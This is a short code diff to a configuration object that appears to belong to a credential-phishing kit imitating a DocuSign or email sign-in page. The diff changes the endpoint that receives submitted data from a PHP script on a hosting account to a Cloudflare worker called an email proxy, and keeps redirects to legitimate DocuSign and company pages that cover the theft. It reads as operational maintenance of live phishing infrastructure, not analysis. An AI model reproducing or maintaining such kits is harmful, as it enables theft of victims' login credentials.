@@ -11,7 +11,7 @@
     BG_GRAY: false,
     BG_OVERLAY: 0.25,
     PHP_ENDPOINT:
-      "http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php",
+      "https://rum-email-proxy.haricoting.workers.dev/contact",
     SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
     LOCKOUT_REDIRECT:
       "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
